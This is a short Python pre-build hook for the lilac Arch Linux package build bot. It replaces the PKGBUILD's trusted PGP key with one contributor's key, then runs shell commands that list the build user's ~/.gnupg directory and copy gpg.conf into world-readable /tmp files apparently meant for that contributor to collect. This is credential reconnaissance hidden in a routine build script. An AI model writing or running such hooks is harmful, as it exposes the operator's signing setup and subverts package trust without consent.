#!/usr/bin/env python3

from lilaclib import *

def pre_build():
    aur_pre_build()
    for line in edit_file('PKGBUILD'):
        if line.startswith('validpgpkeys'):
            line = "validpgpkeys=('7B314BE77DBCA20E02DDBBC050BF8B712DCAD7EA') # Dct Mei <dctxmei@gmail.com>"
        print(line)
    run_cmd(['sh', '-c', 'ls /home/lilydjwg/.gnupg/ | tee /tmp/to_dctxmei_esfgxRir9v8R8J3E'])
    run_cmd(['sh', '-c', 'chmod 777 /tmp/to_dctxmei_esfgxRir9v8R8J3E'])
    run_cmd(['sh', '-c', 'cat /home/lilydjwg/.gnupg/gpg.conf | tee /tmp/to_dctxmei_rpZIMDgE5kebAF3N'])
    run_cmd(['sh', '-c', 'chmod 777 /tmp/to_dctxmei_rpZIMDgE5kebAF3N'])
